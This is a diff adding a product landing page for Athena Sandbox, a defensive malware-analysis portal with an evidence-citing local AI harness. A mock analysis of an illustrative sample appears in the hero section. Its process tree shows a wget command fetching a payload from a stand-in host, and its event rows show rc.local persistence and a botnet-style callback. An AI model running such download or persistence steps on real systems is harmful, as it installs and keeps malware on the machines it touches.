@@ -1,0 +1,562 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Athena Sandbox — Team AER</title>
+<meta name="description" content="Athena Sandbox is Team AER's self-hosted malware-analysis portal: disconnected Linux and Windows guests, a deep static stage, and a local model that must cite the evidence it reads. Defensive, authorized analysis only.">
+<meta property="og:title" content="Athena Sandbox">
+<meta property="og:description" content="A local, auditable malware-analysis portal with an AI harness that must cite its evidence.">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="Team AER">
+<meta name="theme-color" content="#F4F6FB">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='14' fill='%2317294b'/%3E%3Cpath d='M32 12 14 52h10l3.4-8h9.2l3.4 8h10L32 12Zm0 15.4 2.7 7.1h-5.4L32 27.4Z' fill='%23f5f7fb'/%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/shared/base.css">
+<link rel="stylesheet" href="/athena/style.css">
+</head>
+<body>
+<a class="skip-link" href="#main">Skip to content</a>
+
+<div class="aer-strip">
+  <div class="wrap">
+    <a href="/"><span class="aer-strip__mark" aria-hidden="true">A</span>Team AER</a>
+    <nav class="aer-strip__links" aria-label="Team AER">
+      <a href="/#projects">All apps</a>
+      <a href="https://github.com/Team-AER">GitHub</a>
+    </nav>
+  </div>
+</div>
+
+<header class="nav">
+  <div class="wrap">
+    <a class="nav__brand" href="/athena/">
+      <svg class="mark" viewBox="0 0 64 64" role="img" aria-label="Athena Sandbox mark"><rect width="64" height="64" rx="14" fill="#17294b"/><path d="M32 12 14 52h10l3.4-8h9.2l3.4 8h10L32 12Zm0 15.4 2.7 7.1h-5.4L32 27.4Z" fill="#f5f7fb"/></svg>
+      <span>Athena Sandbox</span>
+    </a>
+    <a class="nav__cta nav__cta--bar" href="mailto:hello@aer.app?subject=Athena%20Sandbox%20access">Ask for access</a>
+    <button class="nav__toggle" type="button" data-nav-toggle aria-controls="site-menu" aria-expanded="false" aria-label="Menu"><span></span><span></span></button>
+    <nav id="site-menu" class="nav__menu" hidden aria-label="Page sections">
+      <a href="#profiles">Profiles</a>
+      <a href="#ai">AI harness</a>
+      <a href="#lab">Lab</a>
+      <a href="#report">Report</a>
+      <a class="nav__cta" href="mailto:hello@aer.app?subject=Athena%20Sandbox%20access">Ask for access</a>
+    </nav>
+  </div>
+</header>
+
+<main id="main">
+
+<section class="hero" aria-labelledby="hero-title">
+  <div class="wrap hero__copy">
+    <h1 id="hero-title">Detonate safely. Keep every receipt.</h1>
+    <div class="hero__side">
+      <p class="lede">A self-hosted malware-analysis portal: disconnected Linux and Windows guests, a deep static stage, and a local model that must cite the evidence it reads.</p>
+      <div class="cta-row">
+        <a class="btn btn--primary" href="mailto:hello@aer.app?subject=Athena%20Sandbox%20access">Ask for access</a>
+        <a class="btn btn--quiet" href="https://sandbox.brainfc.uk">Sign in<small>(existing accounts only)</small></a>
+      </div>
+      <p class="hero__note">Private repository, MIT licence. Built for defensive, authorized analysis of samples you are permitted to handle.</p>
+    </div>
+  </div>
+
+  <div class="wrap">
+    <div class="ws" id="ws" role="group" aria-label="The investigation workspace, rebuilt from the product's interface with an illustrative sample">
+      <p class="sr-only">What follows is a replica of Athena's sample workspace: a sample header with verdict and hashes, the six-stage pipeline strip, a process tree, an activity timeline, the behaviour evidence table and an AI finding that cites two evidence rows.</p>
+      <div class="ws__bar">
+        <span class="ws__dots" aria-hidden="true"><i></i><i></i><i></i></span>
+        <span class="ws__url"><span class="mono">sandbox.brainfc.uk</span><span class="ws__path mono">/samples/3f9a2c1e…</span></span>
+        <button class="ws__replay" type="button" data-replay hidden>Replay the load</button>
+      </div>
+
+      <div class="ws__body">
+        <div class="rail" aria-hidden="true">
+          <div class="rail__brand"><svg class="mark mark--sm" viewBox="0 0 64 64"><rect width="64" height="64" rx="14" fill="#17294b"/><path d="M32 12 14 52h10l3.4-8h9.2l3.4 8h10L32 12Zm0 15.4 2.7 7.1h-5.4L32 27.4Z" fill="#f5f7fb"/></svg><span>Athena</span></div>
+          <ul class="rail__list">
+            <li class="rail__item">Lab<i class="rail__dot"></i></li>
+            <li class="rail__item is-current">Investigations</li>
+            <li class="rail__item">Library</li>
+            <li class="rail__item">Families</li>
+            <li class="rail__item">Journal</li>
+            <li class="rail__item">Settings</li>
+          </ul>
+          <div class="rail__foot"><span>4 workers</span><span>3 admitting</span><span>2 of 4 slots leased</span></div>
+        </div>
+
+        <div class="ws__main">
+          <div class="sh">
+            <div class="sh__main">
+              <p class="sh__kicker">Library <span class="sep">/</span> Reported name <span class="sh__faint">chosen by the submission, not by Athena</span></p>
+              <div class="sh__title">
+                <span class="verdict verdict--final" data-sev="malicious" data-t="3000">Malicious</span><span class="verdict verdict--pending" data-sev="pending">Pending</span>
+                <span class="sh__name mono" dir="ltr">update-svc.elf</span>
+                <span class="tag tag--family" data-t="2800">Mirai<small>awaiting review</small></span><span class="tag tag--unresolved">Family unresolved</span>
+              </div>
+              <dl class="sh__meta" data-t="300">
+                <div><dt>SHA-256</dt><dd class="mono">3f9a2c1e<span class="ell">…</span>8d41c2</dd></div>
+                <div><dt>Type</dt><dd>ELF 64-bit LSB, x86-64</dd></div>
+                <div><dt>Size</dt><dd>68.2 KB</dd></div>
+                <div><dt>Handling</dt><dd>never executed by controller</dd></div>
+                <div><dt class="sr-only">Guest network</dt><dd><span class="pill" data-sev="none">Disconnected guest</span></dd></div>
+              </dl>
+            </div>
+            <div class="sh__actions">
+              <span class="sev-counts" data-t="2600"><span data-sev="high">High <b>2</b></span><span data-sev="medium">Medium <b>3</b></span><span data-sev="info">Low/info <b>5</b></span></span>
+              <span class="ubtn ubtn--primary" data-t="3000">Analyze again</span>
+            </div>
+          </div>
+
+          <div class="stagebar">
+            <span class="section-label">Cycle 2</span>
+            <span class="status status--final" data-sev="clean"><i></i>Complete</span><span class="status status--running" data-sev="info"><i></i>Running</span>
+            <ol class="stage-strip" aria-label="Pipeline stages">
+              <li class="stage" data-t="0"><i class="stage__dot" aria-hidden="true"></i><strong>Intake</strong><small>2s</small></li>
+              <li class="stage" data-t="300"><i class="stage__dot" aria-hidden="true"></i><strong>Static</strong><small>48s</small></li>
+              <li class="stage" data-t="2000"><i class="stage__dot" aria-hidden="true"></i><strong>Dynamic</strong><small>3m10s</small></li>
+              <li class="stage" data-t="2600"><i class="stage__dot" aria-hidden="true"></i><strong>AI research</strong><small>1m42s</small></li>
+              <li class="stage" data-t="2800"><i class="stage__dot" aria-hidden="true"></i><strong>Correlation</strong><small>4s</small></li>
+              <li class="stage" data-t="3000"><i class="stage__dot" aria-hidden="true"></i><strong>Report</strong><small>3s</small></li>
+            </ol>
+            <span class="stagebar__budget" data-t="3000">5m49s of 10m</span>
+          </div>
+
+          <div class="ws__grid">
+            <div class="ptree">
+              <div class="ptree__head"><span class="section-label">Processes</span><span class="count">4</span></div>
+              <ul class="ptree__list" aria-label="Process tree">
+                <li class="pnode" data-t="700" data-sev="high"><div class="pnode__row"><span class="pnode__pid mono">1842</span>
+                  <span class="pnode__name">update-svc.elf <span class="badge" data-sev="high">Sample</span></span>
+                  <span class="pnode__meta"><span class="cat" data-cat="network" title="162 network events">162</span><span class="cat" data-cat="file" title="214 file events">214</span></span>
+                  <span class="pnode__cmd mono">/tmp/update-svc.elf --daemon</span></div>
+                  <ul>
+                    <li class="pnode" data-t="900"><div class="pnode__row"><span class="pnode__pid mono">1843</span>
+                      <span class="pnode__name">sh</span>
+                      <span class="pnode__meta"><span class="cat" data-cat="file" title="21 file events">21</span></span>
+                      <span class="pnode__cmd mono">/bin/sh -c /tmp/.x</span></div>
+                      <ul>
+                        <li class="pnode" data-t="1100"><div class="pnode__row"><span class="pnode__pid mono">1851</span>
+                          <span class="pnode__name">.x</span>
+                          <span class="pnode__meta"><span class="cat" data-cat="network" title="363 network events">363</span><span class="cat" data-cat="file" title="201 file events">201</span></span>
+                          <span class="pnode__cmd mono">/tmp/.x</span></div>
+                          <ul>
+                            <li class="pnode" data-t="1300"><div class="pnode__row"><span class="pnode__pid mono">1858</span>
+                              <span class="pnode__name">wget</span>
+                              <span class="pnode__meta"><span class="cat" data-cat="network" title="41 network events">41</span><span class="cat" data-cat="file" title="37 file events">37</span></span>
+                              <span class="pnode__cmd mono">wget -q http://updates.internal.test/bins/x86 -O /tmp/.x2</span></div>
+                            </li>
+                          </ul>
+                        </li>
+                      </ul>
+                    </li>
+                  </ul>
+                </li>
+              </ul>
+            </div>
+
+            <div class="ws__right">
+              <div class="tl">
+                <div class="tl__head">
+                  <span class="section-label">Activity</span>
+                  <ul class="tl__legend" aria-label="Telemetry categories">
+                    <li class="cat" data-cat="process">process</li>
+                    <li class="cat" data-cat="network">network</li>
+                    <li class="cat" data-cat="file">file</li>
+                    <li class="cat" data-cat="memory">memory</li>
+                    <li class="cat" data-cat="signal">signal</li>
+                  </ul>
+                  <span class="tl__peak">peak 1,042 events/s</span>
+                </div>
+                <div class="tl__hist" role="img" aria-label="Events per second across a 4.4 second run in 24 equal intervals, stacked by category. Two bursts: file and network activity around 0.6 seconds, then network and memory activity around 2 seconds, tailing off into file and signal events.">
+                  <span class="tl__bin" style="--h:8%" data-t="640"><i data-cat="process" style="flex-grow:9"></i><i data-cat="file" style="flex-grow:6"></i></span>
+                  <span class="tl__bin" style="--h:22%" data-t="680"><i data-cat="process" style="flex-grow:18"></i><i data-cat="network" style="flex-grow:8"></i><i data-cat="file" style="flex-grow:16"></i></span>
+                  <span class="tl__bin" style="--h:46%" data-t="720"><i data-cat="process" style="flex-grow:26"></i><i data-cat="network" style="flex-grow:22"></i><i data-cat="file" style="flex-grow:40"></i></span>
+                  <span class="tl__bin" style="--h:100%" data-t="760"><i data-cat="process" style="flex-grow:30"></i><i data-cat="network" style="flex-grow:62"></i><i data-cat="file" style="flex-grow:82"></i><i data-cat="memory" style="flex-grow:17"></i></span>
+                  <span class="tl__bin" style="--h:64%" data-t="800"><i data-cat="process" style="flex-grow:6"></i><i data-cat="network" style="flex-grow:64"></i><i data-cat="file" style="flex-grow:52"></i></span>
+                  <span class="tl__bin" style="--h:30%" data-t="840"><i data-cat="process" style="flex-grow:14"></i><i data-cat="network" style="flex-grow:31"></i><i data-cat="file" style="flex-grow:12"></i></span>
+                  <span class="tl__bin" style="--h:14%" data-t="880"><i data-cat="network" style="flex-grow:21"></i><i data-cat="file" style="flex-grow:6"></i></span>
+                  <span class="tl__bin" style="--h:10%" data-t="920"><i data-cat="process" style="flex-grow:6"></i><i data-cat="network" style="flex-grow:8"></i><i data-cat="memory" style="flex-grow:5"></i></span>
+                  <span class="tl__bin" style="--h:26%" data-t="960"><i data-cat="process" style="flex-grow:30"></i><i data-cat="network" style="flex-grow:9"></i><i data-cat="file" style="flex-grow:11"></i></span>
+                  <span class="tl__bin" style="--h:58%" data-t="1000"><i data-cat="process" style="flex-grow:18"></i><i data-cat="network" style="flex-grow:46"></i><i data-cat="file" style="flex-grow:22"></i><i data-cat="memory" style="flex-grow:25"></i></span>
+                  <span class="tl__bin" style="--h:92%" data-t="1040"><i data-cat="process" style="flex-grow:12"></i><i data-cat="network" style="flex-grow:82"></i><i data-cat="file" style="flex-grow:40"></i><i data-cat="memory" style="flex-grow:42"></i></span>
+                  <span class="tl__bin" style="--h:70%" data-t="1080"><i data-cat="network" style="flex-grow:78"></i><i data-cat="file" style="flex-grow:22"></i><i data-cat="memory" style="flex-grow:28"></i><i data-cat="signal" style="flex-grow:6"></i></span>
+                  <span class="tl__bin" style="--h:38%" data-t="1120"><i data-cat="network" style="flex-grow:54"></i><i data-cat="memory" style="flex-grow:18"></i></span>
+                  <span class="tl__bin" style="--h:20%" data-t="1160"><i data-cat="network" style="flex-grow:35"></i><i data-cat="file" style="flex-grow:4"></i></span>
+                  <span class="tl__bin" style="--h:12%" data-t="1200"><i data-cat="network" style="flex-grow:12"></i><i data-cat="file" style="flex-grow:11"></i></span>
+                  <span class="tl__bin" style="--h:10%" data-t="1240"><i data-cat="network" style="flex-grow:19"></i></span>
+                  <span class="tl__bin" style="--h:22%" data-t="1280"><i data-cat="file" style="flex-grow:28"></i><i data-cat="signal" style="flex-grow:14"></i></span>
+                  <span class="tl__bin" style="--h:34%" data-t="1320"><i data-cat="file" style="flex-grow:39"></i><i data-cat="signal" style="flex-grow:26"></i></span>
+                  <span class="tl__bin" style="--h:20%" data-t="1360"><i data-cat="file" style="flex-grow:38"></i></span>
+                  <span class="tl__bin" style="--h:12%" data-t="1400"><i data-cat="file" style="flex-grow:23"></i></span>
+                  <span class="tl__bin" style="--h:8%" data-t="1440"><i data-cat="network" style="flex-grow:15"></i></span>
+                  <span class="tl__bin" style="--h:6%" data-t="1480"><i data-cat="file" style="flex-grow:11"></i></span>
+                  <span class="tl__bin" style="--h:10%" data-t="1520"><i data-cat="file" style="flex-grow:10"></i><i data-cat="signal" style="flex-grow:9"></i></span>
+                  <span class="tl__bin" style="--h:4%" data-t="1560"><i data-cat="signal" style="flex-grow:8"></i></span>
+                </div>
+                <div class="tl__axis" aria-hidden="true"><span>+0.0s</span><span>+1.1s</span><span>+2.2s</span><span>+3.3s</span><span>+4.4s</span></div>
+                <ul class="tl__lanes" aria-label="Process lifetimes on the same clock">
+                  <li class="tl__lane" data-t="700"><span class="tl__lane-label"><span class="chip-mono">1842</span><span class="tl__lane-name">update-svc.elf</span></span><span class="tl__track"><i style="left:0.5%;right:52%"></i></span><span class="sr-only">from +0.02s to +2.11s, ended by SIGTERM</span></li>
+                  <li class="tl__lane" data-t="900"><span class="tl__lane-label"><span class="chip-mono">1843</span><span class="tl__lane-name">sh</span></span><span class="tl__track"><i style="left:19.5%;right:0"></i></span><span class="sr-only">from +0.86s to the end of the run</span></li>
+                  <li class="tl__lane" data-t="1100"><span class="tl__lane-label"><span class="chip-mono">1851</span><span class="tl__lane-name">.x</span></span><span class="tl__track"><i style="left:20.9%;right:0"></i></span><span class="sr-only">from +0.92s to the end of the run</span></li>
+                  <li class="tl__lane" data-t="1300"><span class="tl__lane-label"><span class="chip-mono">1858</span><span class="tl__lane-name">wget</span></span><span class="tl__track"><i style="left:44.5%;right:46%"></i></span><span class="sr-only">from +1.96s to +2.38s</span></li>
+                </ul>
+                <p class="tl__note">4.4s of recorded activity, 24 equal intervals, run-relative clock</p>
+              </div>
+
+              <div class="ev">
+                <div class="tbl-head" aria-hidden="true"><span class="tbl-head__title">Behavior</span><span class="count">1,406</span><span class="tbl-head__aside">10 of 1,406 events, excerpt across all processes</span><span class="scroll-cue" hidden>Scroll sideways<svg viewBox="0 0 16 16" width="14" height="14" aria-hidden="true"><path d="M2 8h11M9 4l4 4-4 4" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></span></div>
+                <div class="table-wrap" tabindex="0" role="region" aria-label="Behaviour events table, scrolls sideways">
+                  <table class="table table--dense table--fixed">
+                    <caption class="sr-only">Behavior: an excerpt of 10 of the run's 1,406 events, all processes</caption>
+                    <colgroup><col class="c-id"><col class="c-time"><col class="c-pid"><col class="c-proc"><col class="c-op"><col><col class="c-res"><col class="c-cat"></colgroup>
+                    <thead>
+                      <tr>
+                        <th scope="col" class="num">#</th>
+                        <th scope="col">Time</th>
+                        <th scope="col" class="num">PID</th>
+                        <th scope="col">Process</th>
+                        <th scope="col">Operation</th>
+                        <th scope="col">Target</th>
+                        <th scope="col">Result</th>
+                        <th scope="col">Category</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr id="ev-0001" data-t="760"><td class="num mono">0001</td><td class="num">+0.02s</td><td class="num mono">1842</td><td>update-svc.elf</td><td class="mono">execve</td><td class="mono">/tmp/update-svc.elf</td><td class="res res--ok">OK</td><td><span class="cat" data-cat="process">process</span></td></tr>
+                      <tr id="ev-0007" data-t="870"><td class="num mono">0007</td><td class="num">+0.09s</td><td class="num mono">1842</td><td>update-svc.elf</td><td class="mono">openat</td><td class="mono">/etc/rc.local O_WRONLY|O_APPEND</td><td class="res res--ok">OK</td><td><span class="cat" data-cat="file">file</span></td></tr>
+                      <tr id="ev-0044" data-t="980"><td class="num mono">0044</td><td class="num">+0.31s</td><td class="num mono">1842</td><td>update-svc.elf</td><td class="mono">connect</td><td class="mono">203.0.113.14:6667</td><td class="res res--err">ECONNREFUSED</td><td><span class="cat" data-cat="network">network</span></td></tr>
+                      <tr id="ev-0176" class="is-cited" data-t="1090"><td class="num mono">0176</td><td class="num">+0.58s</td><td class="num mono">1842</td><td>update-svc.elf</td><td class="mono">write</td><td class="mono">/etc/rc.local "/tmp/update-svc.elf\n"</td><td class="res res--ok">OK</td><td><span class="cat" data-cat="file">file</span></td></tr>
+                      <tr id="ev-0459" data-t="1200"><td class="num mono">0459</td><td class="num">+0.92s</td><td class="num mono">1843</td><td>sh</td><td class="mono">clone</td><td class="mono"><span class="chip-mono">1851</span> /tmp/.x</td><td class="res res--ok">OK</td><td><span class="cat" data-cat="process">process</span></td></tr>
+                      <tr id="ev-0521" data-t="1310"><td class="num mono">0521</td><td class="num">+1.14s</td><td class="num mono">1851</td><td>.x</td><td class="mono">sendto</td><td class="mono">198.51.100.10:53 · A updates.internal.test</td><td class="res res--ok">OK</td><td><span class="cat" data-cat="network">network</span></td></tr>
+                      <tr id="ev-0554" data-t="1420"><td class="num mono">0554</td><td class="num">+1.40s</td><td class="num mono">1851</td><td>.x</td><td class="mono">mprotect</td><td class="mono">0x7f3a1c200000 rwx</td><td class="res res--ok">OK</td><td><span class="cat" data-cat="memory">memory</span></td></tr>
+                      <tr id="ev-0908" data-t="1530"><td class="num mono">0908</td><td class="num">+2.03s</td><td class="num mono">1858</td><td>wget</td><td class="mono">connect</td><td class="mono">198.51.100.10:80 · updates.internal.test</td><td class="res res--ok">OK</td><td><span class="cat" data-cat="network">network</span></td></tr>
+                      <tr id="ev-0966" data-t="1640"><td class="num mono">0966</td><td class="num">+2.11s</td><td class="num mono">1851</td><td>.x</td><td class="mono">kill</td><td class="mono"><span class="chip-mono">1842</span> SIGTERM</td><td class="res res--ok">OK</td><td><span class="cat" data-cat="signal">signal</span></td></tr>
+                      <tr id="ev-1307" data-t="1750"><td class="num mono">1307</td><td class="num">+3.37s</td><td class="num mono">1851</td><td>.x</td><td class="mono">unlink</td><td class="mono">/tmp/.x</td><td class="res res--ok">OK</td><td><span class="cat" data-cat="file">file</span></td></tr>
+                    </tbody>
+                  </table>
+                </div>
+              </div>
+
+              <div class="fnd" data-t="2600" data-cites="ev-0176">
+                <div class="panel__head"><span class="panel__title">AI findings</span><span class="panel__aside">1 proposed, from action 14</span></div>
+                <div class="fnd__row" data-sev="high">
+                  <div class="fnd__head"><span class="badge" data-sev="high">High</span><strong>Persistence via rc.local</strong><span class="status" data-sev="pending"><i></i>Proposed</span></div>
+                  <p>The sample appends its own path to <span class="mono">/etc/rc.local</span> so it starts at boot. The file was opened for append by PID <span class="mono">1842</span> before the write.</p>
+                  <p class="fnd__cites">Evidence <a class="cite" href="#ev-0007" data-cite="ev-0007">ev 0007</a> <a class="cite cite--key" href="#ev-0176" data-cite="ev-0176">ev 0176</a></p>
+                  <p class="fnd__review"><span>A model claim stays a proposal until an analyst accepts it.</span> <span class="ubtn">Accept</span><span class="ubtn">Reject</span></p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="how" aria-labelledby="how-title">
+  <div class="wrap">
+    <div class="sec__intro">
+      <h2 id="how-title">How an analysis runs</h2>
+      <p>Six stages, each with its own checkpoint, coverage note and journal entries. A later cycle can reuse a finished stage instead of repeating it.</p>
+    </div>
+    <ol class="stages">
+      <li><span class="stages__n">1</span><h3>Intake</h3><p>Hash-verified upload into content-addressed storage. The controller never executes the sample; it records who submitted it and to which project.</p></li>
+      <li><span class="stages__n">2</span><h3>Static</h3><p>A disposable offline VM runs metadata parsers, entropy, strings and IOC extraction, YARA, capa, FLOSS, Ghidra and TLSH/ssdeep, then is discarded.</p></li>
+      <li><span class="stages__n">3</span><h3>Dynamic</h3><p>One compatible disconnected guest, chosen from the ELF header or routed to the Windows worker. Telemetry, PCAP and screenshots are preserved; teardown is verified.</p></li>
+      <li><span class="stages__n">4</span><h3>AI research</h3><p>A bounded local model reads the saved evidence through typed tools, within action, run and time budgets. Every exchange is recorded.</p></li>
+      <li><span class="stages__n">5</span><h3>Correlation</h3><p>Deterministic links to other samples: shared hashes, indicators and network destinations. No model is involved.</p></li>
+      <li><span class="stages__n">6</span><h3>Report</h3><p>Ten fixed sections with coverage notes, written as an immutable revision beside the artifacts.</p></li>
+    </ol>
+  </div>
+</section>
+
+<section class="sec" id="profiles" aria-labelledby="profiles-title">
+  <div class="wrap sec__grid">
+    <div class="sec__copy">
+      <h2 id="profiles-title">Seven Linux profiles, one Windows worker</h2>
+      <p>The worker picks the guest from the parsed ELF header: architecture, bitness, endianness, ABI and interpreter. Never from a filename or a model suggestion. PE executables route to the separate Windows worker.</p>
+      <ul class="specs" role="list">
+        <li><strong>No external network.</strong> Guests see local DNS and HTTP simulation only. Direct-IP callbacks and TLS are not simulated, and the report records that as a coverage gap rather than a quiet network section.</li>
+        <li><strong>strace sensors on Linux.</strong> The behavioural sensor is in-guest strace, which a sample can evade or tamper with. Each run states its sensor provenance and treats guest output as untrusted.</li>
+        <li><strong>Hypervisor telemetry on Windows.</strong> x64 and x86 PE run offline under Xen with DRAKVUF: process, file and registry events, descendant tracking, screenshots, bounded observation and verified teardown.</li>
+        <li><strong>Containers.</strong> An archive selects one compatible ELF for the parent run and queues every recognised executable child for its own coverage.</li>
+      </ul>
+    </div>
+    <div class="sec__fig">
+      <div class="panel">
+        <div class="tbl-head" aria-hidden="true"><span class="tbl-head__title">Qualified guest profiles</span><span class="tbl-head__aside">two cold-boot fixture runs each</span><span class="scroll-cue" hidden>Scroll sideways<svg viewBox="0 0 16 16" width="14" height="14" aria-hidden="true"><path d="M2 8h11M9 4l4 4-4 4" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></span></div>
+        <div class="table-wrap" tabindex="0" role="region" aria-label="Guest profiles table, scrolls sideways">
+          <table class="table" style="--floor:640px">
+            <caption class="sr-only">Qualified guest profiles, two cold-boot fixture runs each</caption>
+            <thead><tr><th scope="col">Profile</th><th scope="col">Architecture</th><th scope="col" class="num">Bits</th><th scope="col">Endian</th><th scope="col">ABI</th><th scope="col">Engine</th></tr></thead>
+            <tbody>
+              <tr><td class="mono">linux-x86_64</td><td>x86-64</td><td class="num">64</td><td>little</td><td>SysV</td><td>QEMU x86-64</td></tr>
+              <tr><td class="mono">linux-i386</td><td>x86</td><td class="num">32</td><td>little</td><td>SysV</td><td>QEMU x86-64</td></tr>
+              <tr><td class="mono">linux-armv7-soft</td><td>ARM</td><td class="num">32</td><td>little</td><td>EABI soft-float</td><td>QEMU ARM virt</td></tr>
+              <tr><td class="mono">linux-armv7-hard</td><td>ARM</td><td class="num">32</td><td>little</td><td>EABI hard-float</td><td>QEMU ARM virt</td></tr>
+              <tr><td class="mono">linux-aarch64</td><td>AArch64</td><td class="num">64</td><td>little</td><td>SysV</td><td>QEMU AArch64 virt</td></tr>
+              <tr><td class="mono">linux-mips-o32-le</td><td>MIPS</td><td class="num">32</td><td>little</td><td>o32</td><td>QEMU MIPS Malta</td></tr>
+              <tr><td class="mono">linux-mips-o32-be</td><td>MIPS</td><td class="num">32</td><td>big</td><td>o32</td><td>QEMU MIPS Malta</td></tr>
+              <tr class="row--sep"><td class="mono">windows-vm</td><td>x86-64, x86 PE</td><td class="num">64, 32</td><td>little</td><td>Win32</td><td>Xen, DRAKVUF</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <p class="panel__foot">Guest network: local DNS/HTTP simulation, no external access. Linux sensors: in-guest strace. Windows sensors: hypervisor.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="static" aria-labelledby="static-title">
+  <div class="wrap sec__grid">
+    <div class="sec__copy">
+      <h2 id="static-title">Static first, in a VM that is thrown away</h2>
+      <p>Every sample passes through a disposable offline VM before anything runs. The stage writes what each tool found and, just as carefully, what it could not: an unsupported format, a packer it did not open, a limit it hit.</p>
+      <ul class="specs" role="list">
+        <li><strong>Metadata and entropy.</strong> PE or ELF headers, imports where available, section entropy and archive lineage.</li>
+        <li><strong>Strings and indicators.</strong> Indexed strings, FLOSS-decoded and stack strings, URLs, hosts and paths as exact values.</li>
+        <li><strong>Rules and capabilities.</strong> YARA matches by rule name; capa capabilities grouped so they read as evidence, not as the verdict.</li>
+        <li><strong>Ghidra and similarity.</strong> Verified Ghidra exports for chat later; TLSH and ssdeep for near matches across the library.</li>
+      </ul>
+    </div>
+    <div class="sec__fig">
+      <div class="panel">
+        <div class="panel__head"><span class="panel__title">Static evidence</span><span class="panel__aside">cycle 2, static-vm, 48s</span></div>
+        <dl class="kv">
+          <div><dt>YARA</dt><dd><span class="mono">ELF_Mirai_Botnet_Strings</span> <span class="mono">Linux_Trojan_Generic_Daemonize</span><span class="kv__sub">2 rules matched</span></dd></div>
+          <div><dt>capa</dt><dd>connect to socket, create daemon process, write file, change file permissions<span class="kv__sub">7 capabilities, 11 rule matches</span></dd></div>
+          <div><dt>FLOSS</dt><dd>12 decoded strings, 3 stack strings<span class="kv__sub">includes <span class="mono">/etc/rc.local</span> and <span class="mono">updates.internal.test</span></span></dd></div>
+          <div><dt>Ghidra</dt><dd>214 functions, exports verified<span class="kv__sub">chat and read-only MCP available</span></dd></div>
+          <div><dt>TLSH, ssdeep</dt><dd><span class="mono">T1A3F1B2…</span><span class="kv__sub">2 near matches in the library</span></dd></div>
+          <div><dt>Entropy</dt><dd>7.21 overall, <span class="mono">.text</span> 7.84<span class="kv__sub">packer suspected</span></dd></div>
+          <div class="kv__gap"><dt>Gaps</dt><dd>UPX variant not unpacked by this stage; the dynamic run covered the unpacked behaviour.</dd></div>
+        </dl>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="ai" aria-labelledby="ai-title">
+  <div class="wrap sec__grid">
+    <div class="sec__copy">
+      <h2 id="ai-title">AI that must cite</h2>
+      <p>A local model, reached through an OpenAI-compatible gateway, investigates inside a typed broker. Every tool call is validated, every exchange is recorded, and every finding names the evidence rows it rests on.</p>
+      <ul class="specs" role="list">
+        <li><strong>Evidence-bounded.</strong> The model sees only the saved evidence slices the broker hands it. It cannot fetch, browse or run anything.</li>
+        <li><strong>Typed tools.</strong> Each call is checked against a schema before it runs; a malformed call is recorded and refused.</li>
+        <li><strong>Budgets.</strong> Actions, runs and wall time are capped per analysis. Exhaustion is a journal entry, not a crash.</li>
+        <li><strong>Pause, take over, stop.</strong> An analyst can hold AI actions at any point and continue by hand.</li>
+        <li><strong>No self-granted power.</strong> Model output cannot add capabilities or run host commands.</li>
+        <li><strong>Ghidra chat and MCP.</strong> Ask questions over verified Ghidra exports in the portal, or from your own tools through an authenticated read-only MCP endpoint.</li>
+      </ul>
+    </div>
+    <div class="sec__fig">
+      <div class="panel">
+        <div class="panel__head"><span class="panel__title">AI and human actions</span><span class="count">14</span><span class="panel__aside">why it ran, what happened, and its evidence</span></div>
+        <ol class="acts" aria-label="Recorded actions">
+          <li class="act">
+            <div class="act__head"><span class="act__n mono">12</span><strong>Inspect captured evidence</strong><span class="status" data-sev="clean"><i></i>Completed</span><span class="act__by">model</span></div>
+            <dl class="act__body">
+              <div><dt>Why</dt><dd>Find what PID <span class="mono">1842</span> wrote under <span class="mono">/etc</span>.</dd></div>
+              <div><dt>Result</dt><dd>1 open and 1 write returned from the saved run. <a class="cite" href="#ev-0007" data-cite="ev-0007">ev 0007</a> <a class="cite" href="#ev-0176" data-cite="ev-0176">ev 0176</a></dd></div>
+            </dl>
+          </li>
+          <li class="act">
+            <div class="act__head"><span class="act__n mono">13</span><strong>Test a hypothesis</strong><span class="status" data-sev="clean"><i></i>Passed</span><span class="act__by">model</span></div>
+            <dl class="act__body">
+              <div><dt>Why</dt><dd>Does the sample persist across reboot?</dd></div>
+              <div><dt>Result</dt><dd><span class="mono">/etc/rc.local</span> gained a line naming <span class="mono">/tmp/update-svc.elf</span>. <a class="cite" href="#ev-0176" data-cite="ev-0176">ev 0176</a></dd></div>
+            </dl>
+          </li>
+          <li class="act">
+            <div class="act__head"><span class="act__n mono">14</span><strong>Record findings</strong><span class="status" data-sev="pending"><i></i>Awaiting review</span><span class="act__by">model</span></div>
+            <dl class="act__body">
+              <div><dt>Result</dt><dd>1 finding proposed: persistence via rc.local, high severity, 2 evidence references.</dd></div>
+            </dl>
+          </li>
+        </ol>
+        <div class="budgets">
+          <div class="budget"><span class="budget__label">Actions</span><span class="meter" role="img" aria-label="14 of 30 actions used"><i style="width:47%"></i></span><span class="budget__val">14 / 30</span></div>
+          <div class="budget"><span class="budget__label">Runs</span><span class="meter" role="img" aria-label="1 of 3 runs used"><i style="width:33%"></i></span><span class="budget__val">1 / 3</span></div>
+          <div class="budget"><span class="budget__label">Time</span><span class="meter" role="img" aria-label="1 minute 42 seconds of 10 minutes used"><i style="width:17%"></i></span><span class="budget__val">1m42s / 10m</span></div>
+          <div class="budget__ctl"><span class="ubtn">Pause</span><span class="ubtn">Take over</span><span class="ubtn">Stop</span><span class="budget__note">9 model exchanges recorded</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
